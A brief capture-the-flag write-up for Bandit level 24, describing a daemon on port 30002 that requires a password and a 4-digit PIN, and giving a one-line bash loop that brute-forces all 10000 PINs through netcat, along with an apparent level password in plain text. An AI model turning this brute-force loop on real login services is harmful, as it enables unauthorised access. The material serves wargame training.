# Bandit Level 24
## Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

## Solution
for i in {0000..9999}; do echo “UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i”; done | nc localhost 30002

## Pass
